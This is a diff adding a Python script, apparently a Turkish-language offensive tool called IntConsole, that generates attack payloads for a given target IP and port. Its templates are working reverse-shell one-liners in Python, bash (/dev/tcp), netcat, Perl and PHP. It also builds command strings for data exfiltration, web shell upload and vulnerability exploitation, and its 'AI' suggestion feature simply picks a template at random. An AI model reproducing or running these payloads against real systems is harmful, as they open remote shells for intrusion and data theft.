@@ -1,0 +1,190 @@
+#!/usr/bin/ python3
+import argparse
+import base64
+import random
+import json
+import os
+
+class IntConsole:
+    def __init__(self, rhost, rport, output_file):
+        self.rhost = rhost
+        self.rport = rport
+        self.output_file = output_file
+        self.history_file = "komut_gecmisi.json"
+        
+        # Payload şablonları
+        self.payload_templates = [
+            "import socket; s=socket.socket(); s.connect(('{}', {})); exec(s.recv(1024).decode())",
+            "import os; os.system('bash -i >& /dev/tcp/{}/{} 0>&1')",
+            "echo 'Bağlantı Kuruluyor'; nc {} {} -e /bin/bash",
+            "perl -e 'use Socket;$i=\"{}\";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
+            "php -r '$sock=fsockopen(\"{}\",{});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
+        ]
+
+        # Komut şablonları
+        self.framework_commands = {
+            "reverse_shell": "reverse_shell -ip {} -port {}",
+            "upload_file": "upload_file -source {} -destination {} -ip {} -port {}",
+            "port_scan": "port_scan -target {} -ports {}",
+            "network_sniffer": "network_sniffer -ip {} -port {} -duration {}",
+            "exploit_vulnerability": "exploit_vulnerability -target {} -port {} -vuln_id {}",
+            "data_exfiltration": "data_exfiltration -target {} -file {} -ip {} -port {}",
+            "web_shell_upload": "web_shell_upload -target {} -port {} -file {}",
+            "reconnaissance": "reconnaissance -target {} -ip {} -port {}",
+            "use": "use {}",
+            "set": "set {} {}",
+            "search": "search {}"
+        }
+
+        # Payload geçmişi
+        self.payload_history = self.load_payload_history()
+        self.command_history = self.load_command_history()
+
+    def load_command_history(self):
+        """Geçmiş komutları dosyadan yükler."""
+        if os.path.exists(self.history_file):
+            with open(self.history_file, 'r') as file:
+                return json.load(file)
+        return []
+
+    def load_payload_history(self):
+        """Geçmiş payload'ları yükler."""
+        if os.path.exists("payload_history.json"):
+            with open("payload_history.json", 'r') as file:
+                return json.load(file)
+        return []
+
+    def save_payload_history(self):
+        """Yeni payload'ları dosyaya kaydeder."""
+        with open("payload_history.json", 'w') as file:
+            json.dump(self.payload_history, file, indent=4)
+
+    def save_command_history(self):
+        """Komut geçmişini dosyaya kaydeder."""
+        with open(self.history_file, 'w') as file:
+            json.dump(self.command_history, file, indent=4)
+
+    def generate_command(self, command_type):
+        """Komut üretir."""
+        if command_type in self.framework_commands:
+            command = self.framework_commands[command_type].format(self.rhost, self.rport)
+            return command
+        return "Geçersiz komut türü."
+
+    def generate_payload(self, payload_type):
+        """Payload üretir."""
+        if payload_type < len(self.payload_templates):
+            payload = self.payload_templates[payload_type].format(self.rhost, self.rport)
+            self.payload_history.append(payload)  # Payload'ı kaydeder
+            self.save_payload_history()  # Geçmişi kaydeder
+            return payload
+        return "Geçersiz payload türü."
+
+    def generate_ai_payload(self):
+        """AI tarafından önerilen payload."""
+        print("AI tarafından önerilen payload oluşturuluyor...")
+        
+        # Burada AI'nin payload önerme mantığını simüle ediyoruz
+        payload = random.choice(self.payload_templates).format(self.rhost, self.rport)
+        # Öğrenmeye dayalı öneriler (payload'lar) ekleniyor
+        self.payload_history.append(payload)  
+        self.save_payload_history()  # Geçmişi kaydeder
+        return f"AI önerisi: {payload}"
+
+    def execute_command(self, command):
+        """Komutları yürütür ve geçmişe ekler."""
+        print(f"Yürütülen komut: {command}")
+        self.command_history.append(command)
+        self.save_command_history()
+
+    def handle_ai(self, ai_command):
+        """AI'yi işler."""
+        if ai_command == '--ai':
+            payload = self.generate_ai_payload()
+            print(f"AI Payload: {payload}")
+        else:
+            print("AI komutu geçersiz.")
+
+    def handle_payload_gen(self):
+        """Payload üretme komutunu işler."""
+        payload_type = random.randint(0, len(self.payload_templates) - 1)
+        payload = self.generate_payload(payload_type)
+        print(f"Generated Payload: {payload}")
+
+    def handle_command_gen(self):
+        """Komut üretme komutunu işler."""
+        command_type = random.choice(list(self.framework_commands.keys()))
+        command = self.generate_command(command_type)
+        print(f"Generated Command: {command}")
+        
+    def handle_user_input(self, user_input):
+        """Kullanıcıdan gelen açıklamayı işler ve uygun komutu önerir."""
+        user_input = user_input.lower()
+
+        command_mapping = {
+            "mode": "mode-{mode-name}",
+            "use": "use",
+            "set": "set",
+            "jobs": "jobs",
+            "whoami": "whoami",
+            "neofetch": "neofetch",
+            "item": "item",
+            "search": "search",
+            "exploit": "exploit",
+            "run": "run",
+            "monitor": "monitor",
+            "load_plugins": "load_plugins",
+            "run_plugins": "run_plugins",
+            "show": "show",
+            "back": "back",
+            "break": "break",
+            "install": "int install",
+            "connect": "connect",
+            "color": "color",
+            "list_plugins": "list_plugins"
+        }
+
+        # Finding the closest match to the user's input
+        for keyword, command in command_mapping.items():
+            if keyword in user_input:
+                print(f"Found command for '{user_input}': {command}")
+                return command
+        print(f"No close match found for: {user_input}")
+        return None
+
+    def run(self, args):
+        """Komutları çalıştırır."""
+        if args.command == 'payload-gen':
+            self.handle_payload_gen()
+        elif args.command == 'command-gen':
+            self.handle_command_gen()
+        elif args.command == 'ai':
+            self.handle_ai(args.ai)
+        elif args.command == 'ai' and args.payload_gen:
+            print(f"AI tarafından önerilen payload: {self.generate_ai_payload()}")
+        elif args.command == 'user-input':
+            user_input = input("Please describe what you need in English: ")
+            self.handle_user_input(user_input)
+        else:
+            print("Geçersiz komut.")
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="IntConsole: Komut ve Payload Üretme")
+    
+    # IP (rhost) ve port (rport) argümanları ekledik
+    parser.add_argument('command', help='Komut tipi', choices=['ai', 'payload-gen', 'command-gen', 'user-input'])
+    parser.add_argument('--rhost', help='Hedef IP adresi', required=True)
+    parser.add_argument('--rport', help='Hedef port', required=True, type=int)
+    parser.add_argument('--ai', help='AI komutları için argüman', default=None)
+    parser.add_argument('--payload-gen', help='Payload üretmek için', action='store_true')
+    parser.add_argument('--output', help='Çıktı dosyası', default='output.txt')
+
+    args = parser.parse_args()
+
+    # IP (rhost) ve port (rport) kullanıcıdan alınacak
+    rhost = args.rhost
+    rport = args.rport
+    output_file = args.output
+
+    intconsole = IntConsole(rhost, rport, output_file)
+    intconsole.run(args)
